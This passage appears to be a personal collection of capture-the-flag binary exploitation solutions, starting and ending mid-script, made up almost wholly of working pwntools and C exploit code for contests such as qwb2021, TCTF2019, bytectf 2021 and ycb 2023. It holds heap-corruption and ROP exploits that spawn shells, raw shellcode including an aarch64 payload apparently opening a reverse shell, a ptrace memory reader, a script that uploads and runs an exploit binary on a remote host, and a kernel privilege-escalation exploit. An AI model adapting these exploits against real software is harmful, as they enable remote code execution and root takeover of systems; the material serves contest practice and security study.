context.arch = 'amd64'

p.sendlineafter(b'name?', b'%2$p')
p.recvuntil(b'0x')
leak = int(p.recv(12), 16)
libc_base = leak + 0x1440
print(hex(libc_base))
sys_addr = libc_base + libc.sym['system']
bin_sh = libc_base + libc.search(b'/bin/sh\x00').__next__()
pop_rdi_ret = libc_base + 0x23b6a
ret = pop_rdi_ret + 1

payload = b'a' * 0x60 + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh) + p64(sys_addr)
p.sendlineafter(b'emote?', payload)
#pause()
p.interactive()
```



```python
from pwn import*
elf = ELF('cshell2')
libc = elf.libc
p = process('./cshell2')
context.log_level = 'debug'

def add(idx, size, age, bio):
    p.sendlineafter(b'user', b'1')
    p.sendlineafter(b':', str(idx).encode())
    p.sendlineafter(b':', str(size).encode())
    p.sendafter(b':', b'a' * 8)
    p.sendafter(b':', b'a' * 8)
    p.sendafter(b':', b'a' * 8)
    p.sendlineafter(b':', str(age).encode())
    p.sendafter(b':', bio)
def show(idx):
    p.sendlineafter(b'user', b'2')
    p.sendlineafter(b':', str(idx).encode())
def delete(idx):
    p.sendlineafter(b'user', b'3')
    p.sendlineafter(b':', str(idx).encode())
def edit(idx, age, bio):          #, firstname = b'a' * 8, middlename = b'a' * 8, lastname = b'a' * 8
    p.sendlineafter(b'user', b'4')
    p.sendlineafter(b':', str(idx).encode())
    p.sendafter(b':', b'a' * 8)
    p.sendafter(b':', b'a' * 8)
    p.sendafter(b':', b'a' * 8)
    p.sendlineafter(b':', str(age).encode())
    p.sendafter(b':', bio)
def reage(age):
    p.sendlineafter(b'user', b'5')
    p.sendlineafter(b':', str(age).encode())

add(0, 0x408, 0x100, b'b' * 0x20)
add(1, 0x410, 0x100, b'b' * 0x20)
add(2, 0x408, 0x100, b'b' * 0x20)
delete(1)
edit(0, 0x100, b'a' * 0x3d0)
show(0)
leak = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
libc_base = leak - 0x1c7cc0
libc.address = libc_base

edit(0, 0x100, b'a' * 0x3c0 + p64(0) + p64(0x421))
add(1, 0x410, 0x100, b'b' * 0x20)
delete(2)
edit(1, 0x100, b'a' * 0x3e0)
show(1)
p.recvuntil(b'a' * 0x3e0)
key = u64(p.recvuntil(b'1', drop=True).ljust(8, b'\x00'))

edit(1, 0x100, b'a' * 0x3d0 + p64(0) + p64(0x411))
add(2, 0x408, 0x100, b'b' * 0x20)
delete(0)
delete(2)
edit(1, 0x100, b'a' * 0x3d0 + p64(0) + p64(0x411) + p64(key ^ 0x404010))

p.sendlineafter(b'user', b'1')
p.sendlineafter(b':', str(0).encode())
p.sendlineafter(b':', str(0x408).encode())
p.sendafter(b':', b'/bin/sh\x00')
p.sendafter(b':', b'a' * 8)
p.sendafter(b':', b'a' * 8)
p.sendlineafter(b':', str(111).encode())
p.sendafter(b':', b'a')

p.sendlineafter(b'user', b'1')
p.sendlineafter(b':', str(2).encode())
p.sendlineafter(b':', str(0x408).encode())
p.sendafter(b':', b'\x80')
p.sendafter(b':', p64(libc.sym['system']))
p.sendafter(b':', b'\xb0')
p.sendlineafter(b':', str(0x401056).encode())
p.sendafter(b':', b'\x40')

delete(0)
p.interactive()
```



##### qwb2021

```python
from pwn import*
elf = ELF('baby_diary')
libc = elf.libc
p = process('./baby_diary')
context.log_level = 'debug'

def write(size, content):
    p.sendlineafter(b'>>', b'1')
    p.sendlineafter(b':', str(size).encode())
    p.sendafter(b':', content)

def read(idx):
    p.sendlineafter(b'>>', b'2')
    p.sendlineafter(b':', str(idx).encode())

def delete(idx):
    p.sendlineafter(b'>>', b'3')
    p.sendlineafter(b':', str(idx).encode())

write(0x60, b'\n')
for i in range(10):
    write(0x4f0, b'\n')

delete(5)
delete(2)
delete(8)
delete(4)
write(0x520, b'\n') #4 -> 2
write(0x4c0, b'\n') #5 -> 4
write(0x4f0, b'\n') #8 -> 5
write(0x4f0, b'\n') #2 -> 8

delete(4)
delete(8)
delete(5)
delete(1)
write(0x520, b'\n') #1 -> 1
write(0x4c0, b'\n') #2 -> 4
write(0x4c0, b'\n') #5 -> 5
write(0x4f0, b'\n') #8 -> 8

delete(5)
delete(4)
delete(8)
delete(7)
write(0x520, b'\n') #7 -> 4
write(0x4c0, b'\n') #8 -> 5
write(0x4c0, b'a\n') #2 -> 7
write(0x4c0, b'\n') #5 -> 8

delete(4)
write(0x520, b'\x00' * 0x4f8 + p64(8) + b'\n')
delete(1)
write(0x520, b'\x00' * 0x4f8 + p64(7) + b'\n')
delete(1)
write(0x520, b'\x00' * 0x4f0 + p64(0x19) + b'\n')
delete(1)
write(0x510, b'\x00' * 0x4ef + p64(0x1) + b'\n')

delete(3)
write(0x4c0, b'\n') #3
write(0x27, b'\x00' * 0x27) #11
delete(11)
write(0x27, b'\x00' * 0x18 + p64(0x19) + b'\n')
delete(2)

write(0x20, b'\n') #2
read(7)
leak = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
libc_base = leak - 96 - libc.sym['__malloc_hook'] - 0x10
libc.address = libc_base

delete(2)
delete(11)
write(0x9c0, b'\x00' * 0x998 + p64(0x31) + p64(libc.sym['__free_hook']) + b'\n') #2
write(0x20, b'/bin/sh\x00' + b'\n')
write(0x20, p64(libc.sym['system']) + b'\n')
delete(11)
p.interactive()
```



```python
from pwn import*
elf = ELF('pipeline')
libc = elf.libc
p = process('./pipeline')
context.log_level = 'debug'
def new():
    p.sendlineafter(b'>>', b'1')
def edit(idx, offset, size):
    p.sendlineafter(b'>', b'2')
    p.sendlineafter(b':', str(idx).encode())
    p.sendlineafter(b':', str(offset).encode())
    p.sendlineafter(b':', str(size).encode())
def destory(idx):
    p.sendlineafter(b'>', b'3')
    p.sendlineafter(b':', str(idx).encode())
def append(idx, size, content):
    p.sendlineafter(b'>', b'4')
    p.sendlineafter(b':', str(idx).encode())
    p.sendlineafter(b':', str(size).encode())
    p.sendlineafter(b':', content)
def show(idx):
    p.sendlineafter(b'>', b'5')
    p.sendlineafter(b':', str(idx).encode())

new()
new()
edit(0, 0, 0x410)
new()
edit(0, 0, 0x420)
edit(1, 0, 0x410)
show(1)
leak = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
libc_base = leak - 96 - libc.sym['__malloc_hook'] - 0x10
libc.address = libc_base
append(1, -63488, b'/bin/sh\x00'.ljust(0x410, b'\x00') + p64(0) + p64(0x21) + p64(libc.sym['__free_hook']) + p32(0) + p32(0x20) + b'\n')
append(2, 0x8, p64(libc.sym['system']))
edit(1, 0, 0)
# gdb.attach(p)
# pause()
p.interactive()
```



```python
from pwn import*
from ctypes import*
elf = ELF('babypwn')
libc = elf.libc
p = process('./babypwn', aslr=False)
context.log_level = 'debug'
context.arch = 'amd64'

def deshow(a):
    for i in range(2):
        t = (32 * a) & 0xffffffff
        b = a ^ t
        a ^= t ^ (b >> 17) ^ ((b ^ ((b >> 17)) << 13) & 0xffffffff)

def add(size):
    p.sendlineafter(b'>>>', b'1')
    p.sendlineafter(b':', str(size).encode())
def delete(idx):
    p.sendlineafter(b'>>>', b'2')
    p.sendlineafter(b':', str(idx).encode())
def edit(idx, content):
    p.sendlineafter(b'>>>', b'3')
    p.sendlineafter(b':', str(idx).encode())
    p.sendafter(b':', content)
def show(idx):
    p.sendlineafter(b'>>>', b'4')
    p.sendlineafter(b':', str(idx).encode())

for i in range(8):
    add(0xf0)
add(0x38)
for i in range(0, 6):
    delete(i)
delete(7)

for i in range(2):
    add(0x100)
delete(1)
delete(6)
edit(0, b'a' * 0xf0 + p64(0) + p64(0x121))
edit(8, b'a' * 0x38)
edit(8, b'a' * 0x30 + p64(0x240))
delete(0)

delete(8)
add(0x1f0)  #0
add(0x90)   #1
edit(1, b'\x60' + b'\x77')
add(0x38)   #2
add(0x38)   #3
edit(3, p64(0xfbad1800) + p64(0) * 3 + b'\x00')
leak = u64(p.recvuntil(b'\x15')[-6:].ljust(8, b'\x00'))
libc_base = leak - 0x3ed8b0
libc.address = libc_base
pop_rdi_ret = libc_base + 0x2155f
pop_rsi_ret = libc_base + 0x23e6a
pop_rdx_ret = libc_base + 0x1b96
ret = pop_rdi_ret + 1
data_base = libc.sym['__free_hook'] & 0xfffffffffffff000

delete(2)
edit(1, p64(libc.sym['__free_hook']))
edit(0, b'\x00' * 0xf0 + p64(0) + p64(0x101) + p64(data_base))
add(0xf0)
add(0xf0)
add(0x90)
add(0x90)

edit(6, p64(libc.sym['setcontext'] + 53))

payload = asm(shellcraft.cat('/flag')) + b'\x00' * 0x13
payload += flat([
    pop_rdi_ret, data_base,
    pop_rsi_ret, 0x1000,
    pop_rdx_ret, 7,
    libc.sym['mprotect'],
    data_base
])
payload = payload.ljust(0xa0, b'\x00')
payload += p64(data_base + 0x48) + p64(ret)
edit(4, payload)

delete(4)
p.interactive()
```



```python
from pwn import*
elf = ELF('test')
p = process('./test')

p.send(b'\x00' * 0x30)
p.send(b'\x00' * 0x20)
payload = b''

with open('payload','rb') as f:
    payload = f.read()

p.sendline(b'-2147483648')
p.sendline(b'-1')

gdb.attach(p)
pause()
p.send(payload)

payload1 = b''
with open('payload1','rb') as f:
    payload1 = f.read()
pause()
p.send(payload1)
pause()
p.interactive()

import sys
sys.path.append('/home/x/roputils')
from roputils import*

offset = 76
rop = ROP('test')
addr_bss = rop.section('.bss')

buf = rop.retfill(offset)
buf += rop.call('read', 0, addr_bss, 100)
buf += rop.dl_resolve_call(addr_bss+20, addr_bss)

with open('payload','wb') as f:
      f.write(buf)

buf = rop.string('/bin/sh')
buf += rop.fill(20, buf)
buf += rop.dl_resolve_data(addr_bss+20, 'system')
buf += rop.fill(100, buf)

with open('payload1','wb') as f:
      f.write(buf)
```



##### CATCTF injection2.0

```cc
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/reg.h>
#include <sys/user.h>
#include <sys/syscall.h>
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <stdlib.h>

char flag[0x30];

int main(int argc, char *argv[]){
    struct user_regs_struct regs;
    int status = 0;
    pid_t pid = 131;
    if(argc == 2)
        pid = atoi(argv[1]);
    uint64_t rsp;

    if(ptrace(PTRACE_ATTACH, pid, NULL , NULL) < 0){
        perror("attch err");
    }

    while(1){
        if(ptrace(PTRACE_SYSCALL, pid, NULL, NULL) < 0){
            perror("syscall eer");
        }
        waitpid(pid, &status, 0);
        ptrace(PTRACE_GETREGS, pid ,NULL, &regs);
        if(regs.orig_rax == 1){
            rsp = regs.rsp + 0x18;
            for(int i = 0; i < 6; i++){
                *((size_t*)(flag + i * 8)) = ptrace(PTRACE_PEEKDATA, pid, (rsp + 8 * i), NULL);
                    
            }
            break;
        }
    }

    ptrace(PTRACE_DETACH, pid, NULL, NULL);

    printf("flag is %s\n", flag);
    

}
```



##### ichunqiu p2048

```python
from pwn import*
elf = ELF('p2048')
#p = process('./p2048')
p = remote('47.93.6.210', 27615)
p.send(b'x' * 0x43c)
#gdb.attach(p)
#pause()
p.send(b'\\x0b')
p.send(b's')
#pause()
p.interactive()
```

##### ichunqiu babygame

```python
from pwn import*
import hashlib
elf = ELF('pwn')
#p = process('./pwn')
p = remote('47.93.6.210', 12723)
context.log_level = 'debug'
st = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A']

def demd5(s1, s2):
    n = b''
    for i in st:
        n = i.encode() + s1
        if hashlib.md5(n).hexdigest().encode() == s2:
            return n

p.sendlineafter(b'>>', b'1')
p.sendlineafter(b':', b'1')
for i in range(0x200):
    p.recvuntil(b'?')
    s1 = p.recv(3)
    p.recvuntil(b'== ')
    s2 = p.recv(32)
    p.sendlineafter(b':', demd5(s1, s2))
p.sendlineafter(b':', b'a')

p.sendlineafter(b'>>', b'2')
p.sendlineafter(b'>>', b'2')
p.sendlineafter(b':', b'256')
p.sendlineafter(b'>>', b'2')
p.sendlineafter(b'>>', b'1')

payload = b'A' + b'\\x47' + b'0' + b'\\x47'
payload += b'A' + b'\\x48' + b'0' + b'0'
payload += b'A' + b'\\x49' + b'0' + b'2'
payload += b'C' + b'\\x6f' + b'0' + b'0'
payload += b'Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M'
payload += b'2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2'
payload += b'y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t'
#gdb.attach(p)
#pause()
p.send(payload)
p.sendlineafter(b'>>', b'2')
p.sendlineafter(b'>>', b'3')
#pause()
p.interactive()
```

##### ichunqiu sign_shellcode

```python
from pwn import*
elf = ELF('pwn')
#p = process(['qemu-mipsel', '-L', './', './pwn'])
#p = process(['qemu-mipsel', '-L', './', '-g', '1234', './pwn'])
#context.log_level = 'debug'
p = remote('39.106.131.193', 41604)
context(arch='mips', endian='little')

t = 0xb945
def get_coin(num):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b'?', str(num).encode())

def pwn():
    for i in range(99):
        get_coin(t % (i + 1))

    p.sendlineafter(b'>', b'3')
    p.sendlineafter(b'>', b'3')
    p.sendlineafter(b'>', b'3')
    p.sendlineafter(b'>', b'2')
    get_coin(0)
    p.recvuntil(b'Shellcode >', timeout=1)
    #pause()
    shellcode = "move $a1, $zero; move $a2, $zero"
    p.send(asm(shellcode).ljust(0x10, b'\\x00'))
    #pause()
    p.interactive()

pwn()
```



##### qwb2020 game(mips64)

```python
from pwn import*
elf = ELF('httpd')
#libc = ELF('./lib/libc.so.0')
context(arch='mips64', endian='big', log_level = 'debug')
p = remote('127.0.0.1', 3333)

def add(idx, size, data):
    msg = 'POST /../httpd HTTP/1.0\r\n'
    msg += 'Content-Indexx: {}\r\n'.format(idx)
    msg += 'Content-Length: {}\r\n'.format(size)
    msg += '\r\n'
    p.send(msg.encode())
    p.send(data)
    for i in range(6):
        p.recvuntil(b'\r\n')

def pwn(content):
    msg = b'POST /../httpd HTTP/1.0\r\n'
    msg += b'Content-Length: '
    msg += content
    msg += b'\r\n'
    p.send(msg)
    for i in range(6):
        p.recvuntil(b'\r\n')

def show(idx):
    msg = 'GET /../httpd?Show={} HTTP/1.0\r\n'.format(idx)
    msg += '\r\n'
    p.send(msg.encode())
    for i in range(6):
        p.recvuntil(b'\r\n')

def delete(idx):
    msg = 'GET /../httpd?Del={} HTTP/1.0\r\n'.format(idx)
    msg += '\r\n'
    p.send(msg.encode())
    for i in range(6):
        p.recvuntil(b'\r\n')

add(0, 0x10, b'a' * 0x10)
add(1, 0x50, b'a' * 0x50)
add(2, 0x10, b'a' * 0x10)
payload = b'-1' + b'a' * (0x200 - 2) + p64(0) + p64(0x41)
pwn(payload)
delete(0)
add(0, 0x30, b'\x00' * 0x30)
delete(1)
payload = b'-1' + b'a' * (0x200 - 2) + p64(0) + p64(0x41) + b'a' * 0x23
pwn(payload)
show(0)
p.recvuntil(b'a' * 0x23)
leak = u64(p.recv(5).rjust(8, b'\x00'))
libc_base = leak - 0xc2d48
munamp_got = libc_base + 0xa9228
sys_addr = libc_base + 0x65370

payload = b'-1' + b'a' * (0x200 - 2) + p64(0) + p64(0x21) + b'a' * 0x10 + p64(0) + p64(0x61)
pwn(payload)
delete(0)
payload = b'-1' + b'a' * (0x200 - 2) + p64(0xfffffffffffffff0) + p64(0x63) + p64(munamp_got - 0x10 + 3)
pwn(payload)
add(0, 8, b'/bin/sh\x00')
add(3, 5, p64(sys_addr)[3:])
p.send(b'GET /../httpd?Del=0 HTTP/1.0\r\n\r\n')
p.interactive() 
```



##### TCTF2019 embedded_heap

```python
from pwn import*
elf = ELF('embedded_heap')
libc = ELF('libuClibc-0.9.33.2.so')
context(arch='mips', endian='big', log_level = 'debug')
p = remote('192.168.184.131', 9999)

def upd(idx, size, content):
    p.sendlineafter(b'Command:', b'1')
    p.sendlineafter(b'Index:', str(idx).encode())
    p.sendlineafter(b'Size:', str(size).encode())
    p.sendafter(b'Content:', content)

def view(idx):
    p.sendlineafter(b'Command:', b'2')
    p.sendlineafter(b'Index:', str(idx).encode())

chunk_size = []
for i in range(3):
    p.recvuntil('Chunk[{}]: '.format(i).encode())
    s = int(p.recvuntil(b' ', drop=True), 10)
    if (s % 8) <  4:
        if s < 4:
            s = 0xc
        else:
            s = (s // 4 + 1) * 4
    else:
        s = (s // 4 + 2) * 4
    print(hex(s))
    chunk_size.append(s)

payload = b'a' * chunk_size[0] + p32(9) + p32(0) + p32(0x11) +  b'b' * (chunk_size[1] - 8) + p32(0x305d9)
upd(0,  len(payload), payload)

p.sendlineafter(b'Command:', b'3')
p.sendlineafter(b'Index:', b'1')
p.sendlineafter(b'Index:', b'2')
p.sendlineafter(b'Index:', b'0')
payload = b'a' * (chunk_size[0]  + chunk_size[1]) 
payload += b"\x24\x06\x06\x66\x04\xd0\xff\xff\x28\x06\xff\xff\x27"
payload += b"\xbd\xff\xe0\x27\xe4\x10\x01\x24\x84\xf0\x1f\xaf\xa4"
payload += b"\xff\xe8\xaf\xa0\xff\xec\x27\xa5\xff\xe8\x24\x02\x0f"
payload += b"\xab\x01\x01\x01\x0c\x2f\x62\x69\x6e\x2f\x73\x68\x00"

p.sendlineafter(b'Size:', str(len(payload)).encode())
p.sendafter(b'Content:', payload)
p.interactive()
#0x66d70
#0x182e4 
```



##### bytectf 2021 mini_httpd

```python
from pwn import*
import requests
elf = ELF('mini_httpd')
context.arch = 'aarch64'
p = remote('192.168.184.131', 80)

csu1 = 0x407D9C
csu2 = 0x407D78
#shellcode = asm(shellcraft.cat('/flag'))
buf =  b""
buf += b"\x40\x00\x80\xd2\x21\x00\x80\xd2\x02\x00\x80\xd2\xc8"
buf += b"\x18\x80\xd2\x01\x00\x00\xd4\xe3\x03\x00\xaa\x41\x03"
buf += b"\x00\x10\x02\x02\x80\xd2\x68\x19\x80\xd2\x01\x00\x00"
buf += b"\xd4\x60\x02\x00\x35\xe0\x03\x03\xaa\x02\x00\x80\xd2"
buf += b"\x01\x00\x80\xd2\x08\x03\x80\xd2\x01\x00\x00\xd4\x21"
buf += b"\x00\x80\xd2\x08\x03\x80\xd2\x01\x00\x00\xd4\x41\x00"
buf += b"\x80\xd2\x08\x03\x80\xd2\x01\x00\x00\xd4\x80\x01\x00"
buf += b"\x10\x02\x00\x80\xd2\xe0\x03\x00\xf9\xe2\x07\x00\xf9"
buf += b"\xe1\x03\x00\x91\xa8\x1b\x80\xd2\x01\x00\x00\xd4\x00"
buf += b"\x00\x80\xd2\xa8\x0b\x80\xd2\x01\x00\x00\xd4\x02\x00"
buf += b"\x27\x0f\xc0\xa8\xb8\x8e\x2f\x62\x69\x6e\x2f\x73\x68"
buf += b"\x00\x00\x00\x00\x00\x00\x00\x00\x00"

payload = b'a' * 0x108 + p64(csu1) + p64(0) * 2 + p64(0x423280 + 0x400) + p64(csu2) + p64(0)
payload += p64(1) + p64(0x423280 + 0x300)
payload += p64(0x423000) + p64(0x1000)
payload += p64(7)
payload += p64(0) + p64(0x423280 + 0x300 + 8)

msg = b'GET /admin/ HTTP/1.1\r\n'
msg += b'Host: 192.168.184.131\r\n'
msg += b'Authorization: Basic ' + base64.b64encode(payload)
msg += b'\r\n\r\n'
msg = msg.ljust(0x300, b'\x00')
msg += p64(elf.plt['mprotect'])
msg += buf
p.send(msg) 
```



##### ycb 2023

```python
from pwn import*
elf = ELF('pwn')
#p = process("qemu-riscv64 -L /usr/riscv64-linux-gnu ./pwn".split())
#p = process("qemu-riscv64 -L /usr/riscv64-linux-gnu -g 1234 ./pwn".split())
p = remote('tcp.cloud.dasctf.com', 28319)
p.sendafter(b':', b'/bin/sh\x00')
payload = b'a' * 0x100 + p64(0x12345770)
p.sendafter(b'words', payload)
p.interactive() 
```



```python
from pwn import*
elf = ELF('heap')
libc = ELF('libc-2.35.so')
# p = process('./heap')
#p = process(["./ld-2.35.so","./heap"],env={"LD_PRELOAD":"./libc-2.35.so"})
p = remote('tcp.cloud.dasctf.com', 20639)
context.log_level = 'debug'

def add(content):
    msg = b'1 ' + content
    p.sendlineafter(b'Your chocie:', msg)

def show(idx):
    msg = b'2 ' + str(idx).encode()
    p.sendlineafter(b'Your chocie:', msg)

def edit(idx, content):
    msg = b'3 ' + str(idx).encode() + b':' + content
    p.sendlineafter(b'Your chocie:', msg)

def delete(idx):
    msg = b'4 ' + str(idx).encode()
    p.sendlineafter(b'Your chocie:', msg)


add(b'a' * 0x63)
sleep(1)
add(b'a' * 0x50)
sleep(1)
add(b'a' * 0x68)
sleep(1)
delete(1)
sleep(1)
edit(0, b'a' * 0x60 + b'b' * 3)
delete(0)
add(b'a' * 0x50)
sleep(3)

show(0)
#delete(0)
p.recvuntil(b'paper content:')
p.recvuntil(b'b' * 3)
heap_addr = u64(p.recvuntil(b'\x7f').ljust(8, b'\x00')) << 24
sleep(1.5)
p.sendline(b'1 ' + b'a' * 0x68)
sleep(1)

add(b'a' * 0x62)
sleep(1)
add(b'a' * 0x50)
add(b'a' * 0x68)
delete(4)
edit(3, b'a' * 0x60 + b'\xa0' + b'\x08')
delete(3)
add(b'a' * 0x50)
sleep(2)

show(5)
p.recvuntil(b'paper content:')
leak = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
libc_base = leak - 0x219c80
libc.address = libc_base
print(hex(libc_base))
sleep(1.5)
p.sendline(b'1 ' + b'a' * 0x68)
sleep(1)

add(b'a' * 0x62)
sleep(1)
add(b'a' * 0x50)
sleep(1)
add(b'a' * 0x68)
sleep(1)
delete(7)
sleep(1)
edit(6, b'a' * 0x60 + b'\x70' + b'\x0b')
delete(6)
add(b'a' * 0x50)
sleep(2)
add(b'a' * 0x68)
sleep(1)

add(b'a' * 0x62)
sleep(1)
add(b'a' * 0x50)
sleep(1)
add(b'a' * 0x68)
sleep(1)
delete(10)
sleep(1)
edit(9, b'a' * 0x60 + b'\x78' + b'\x0b')
delete(9)
add(b'a' * 0x50)
sleep(2)

edit(8, p64(libc.sym['_IO_2_1_stderr_']))
sleep(3)
edit(11, p64(8))
sleep(3)
edit(0, b'/bin/sh')
sleep(3)

edit(8, p64(libc.sym['_IO_2_1_stderr_'] + 0xa0))
sleep(3)
edit(11, p64(8))
sleep(3)
edit(0, p64(libc.sym['_IO_2_1_stderr_'] + 0x30 - 0x70))
sleep(3)

edit(8, p64(libc.sym['_IO_2_1_stderr_'] + 0xc0))
sleep(3)
edit(11, p64(0x20))
sleep(3)
edit(0,  b'a' * 0x18 + p64(libc.sym['_IO_wfile_jumps'] + 0x30))
sleep(3)

edit(8, p64(libc.sym['_IO_2_1_stderr_'] - 0x28))
sleep(3)
edit(11, p64(8))
sleep(3)
edit(0,  p64(libc.sym['system']))
sleep(6)
# gdb.attach(p)
# pause()
p.sendlineafter(b'Your chocie:', b'5')
# p.sendline(b'cat flag')
# p.recvuntil(b'{')
p.interactive() 
```



```python
from pwn import*
elf = ELF('pwn')
libc = elf.libc
#p = process('./pwn')
p = remote('tcp.cloud.dasctf.com',21287)
#context.log_level = 'debug'

def push():
    return p64(1)

def pop():
    return p64(2)

def mov():
    return p64(3)

def st():
    return p64(5)

def add(num):
    return p64(6) + p64(num)

def sub(num):
    return p64(7) + p64(num)

magic_num = 0x3c4b78
IO_list_all = libc.sym['_IO_list_all'] - magic_num
sys_addr = magic_num - libc.sym['system']
bin_sh = 0x68732f6e69622f

payload = pop() + push() * 2 + st() + sub(0x2040) + push() * 2 + pop() + st() + add(IO_list_all) + mov() + pop()
payload += push() * 0x12 + add(0x30) + push() * 7 + add(0x98) + push() + sub(0xc8) + st() + sub(sys_addr) + push()
payload += pop() * 0x1d + add(IO_list_all + 0x10) + st() + add(bin_sh) + push() + sub(bin_sh) + push() * 5
payload += add(1) + push() + sub(1) + push() * 2 + add(1) + push() + add(1) + push()

#payload += add(0x30) * 7 + add()
# gdb.attach(p, '''
# b *$rebase(0xAB7)
# c
# ''')
# pause()
p.sendafter(b':', payload)
pause()
p.interactive()
```



```python
from pwn import*
elf = ELF('cookieBox')
libc = ELF('libc.so')
#p = process('./cookieBox')
p = remote('tcp.cloud.dasctf.com',26966)
context.log_level = 'debug'

def add(size, content):
    p.sendlineafter(b'>>', b'1')
    p.sendlineafter(b':', str(size).encode())
    p.sendafter(b':', content)

def delete(idx):
    p.sendlineafter(b'>>', b'2')
    p.sendlineafter(b':', str(idx).encode())

def edit(idx, content):
    p.sendlineafter(b'>>', b'3')
    p.sendlineafter(b':', str(idx).encode())
    p.sendafter(b':', content)

def show(idx):
    p.sendlineafter(b'>>', b'4')
    p.sendlineafter(b':', str(idx).encode())


add(0x100, b'a' * 0x100)
add(0x100, b'a' * 0x100)
delete(1)
delete(0)
add(0x100, b'a' * 0x100)
delete(1)
show(2)
leak = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
libc_base = leak - 0x292e50
libc.address = libc_base
stdin = libc.sym['__stdin_FILE']

add(0x100, b'a\n')
edit(2, p64(stdin - 0x10) * 2 + b'\n')
add(0x100, b'a\n')

add(0x100, b'a\n')
add(0x100, b'a\n')
delete(5)
add(0x100, b'a\n')
delete(5)

edit(7, p64(stdin - 0x10) + p64(libc_base + 0x292b80))
add(0x100, b'a\n')


p.sendlineafter(b'>>', b'1')
p.sendlineafter(b':', str(0x100).encode())
payload = b'/bin/sh\x00' + p64(0) * 6 + p64(1) + p64(0) + p64(libc.sym['system'])
p.send(payload)
# gdb.attach(p)
# pause()
p.sendlineafter(b'>>', b'5')
p.interactive()
```



### kernel pwn



```python
from pwn import *
import base64
#context.log_level = "debug"

with open("./exp", "rb") as f:
    exp = base64.b64encode(f.read())

p = remote('node4.buuoj.cn',26177)
#p = process('./run.sh')
try_count = 1
while True:
    p.sendline()
    p.recvuntil(b"/ $")

    count = 0
    for i in range(0, len(exp), 0x200):
        p.sendline("echo -n \"".encode() + exp[i:i + 0x200] + "\" >> /tmp/b64_exp".encode())
        count += 1
        log.info("count: " + str(count))

    for i in range(count):
        p.recvuntil(b"/ $")
    
    p.sendline(b"cat /tmp/b64_exp | base64 -d > /tmp/exploit")
    p.sendline(b"chmod +x /tmp/exploit")
    p.sendline(b"/tmp/exploit")
    break

p.interactive()
```





##### 强网杯2018 - core

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/ioctl.h>

#define POP_RDI_RET 0xffffffff81000b2f
#define POP_RSI_RET 0xffffffff810011d6
#define POP_RDX_RET 0xffffffff810a0f49
#define MOV_RDI_RAX_CALL_RDX 0xffffffff8101aa6a
#define POP_RCX_RET 0xffffffff81021e53
#define SWAPGS_POPFQ_RET 0xffffffff81a012da
#define IRETQ 0xffffffff81050ac2
#define SYSRETQ 0xffffffff81a00148

size_t commit_creds = NULL, prepare_kernel_cred = NULL;

size_t user_cs, user_ss, user_rflags, user_sp;
void saveStatus()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    printf("[*] Status has been saved. \n");
}

void read_core(int fd, char *buf){
    ioctl(fd, 0x6677889B, buf);
}

void setoff_core(int fd, size_t offest){
    ioctl(fd, 0x6677889C, offest);
}

void copy_core(int fd, size_t size){
    ioctl(fd, 0x6677889A, size);
}

void getshell(){
    if(getuid()){
        printf("[x] Failed to get the root!\n");
        exit(-1);
    }
    system("/bin/sh");
}


int main(){
    saveStatus();

    int fd = open("/proc/core", 2);
    if(fd < 0){
        printf("[x] Failed to open core\n");
        exit(-1);
    }

    FILE *sym_table_fd = fopen("/tmp/kallsyms", "r");
    if(sym_table_fd < 0){
        printf("[x] Failed to open sym_table\n");
        exit(-1);
    }

    size_t addr;
    char sym_name[0x40];
    char sym_type[0x10];
    while(fscanf(sym_table_fd, "%llx%s%s", &addr, &sym_type, &sym_name))
    {
        if(commit_creds && prepare_kernel_cred){
            break;
        }
        if(!strcmp("commit_creds", sym_name)){
            commit_creds = addr;
            printf("[+] Successful to get the addr of commit_cread: %llx \n", commit_creds);
            continue;
        }
        if(!strcmp("prepare_kernel_cred", sym_name)){
            prepare_kernel_cred = addr;
            printf("[+] Successful to get the addr of prepare_kernel_cred : %llx \n", prepare_kernel_cred);
            continue;
        }
    }
    
    char buf[0x40];
    setoff_core(fd, 64);
    read_core(fd, buf);
    size_t canary = ((size_t*)(buf))[0];
    size_t offset = commit_creds - 0xffffffff8109c8e0;
    size_t rop[0x40], i = 0;
    for(;i < 10; ++i)
        rop[i] = canary;
    rop[i++] = POP_RDI_RET + offset;
    rop[i++] = 0;
    rop[i++] = prepare_kernel_cred;
    rop[i++] = POP_RDX_RET + offset;
    rop[i++] = POP_RSI_RET + offset;
    rop[i++] = MOV_RDI_RAX_CALL_RDX + offset;
    rop[i++] = commit_creds;
    rop[i++] = SWAPGS_POPFQ_RET + offset;
    rop[i++] = 0;
    rop[i++] = IRETQ + offset;
    rop[i++] = (size_t)getshell;
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;

    write(fd, rop, 0x800);
    copy_core(fd, 0xffffffffffff0000 | (0x100));
}
```









```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/ioctl.h>

#define POP_RDI_RET 0xffffffff81000b2f
#define POP_RSI_RET 0xffffffff810011d6
#define POP_RDX_RET 0xffffffff810a0f49
#define MOV_RDI_RAX_CALL_RDX 0xffffffff8101aa6a
#define POP_RCX_RET 0xffffffff81021e53
#define SWAPGS_POPFQ_RET 0xffffffff81a012da
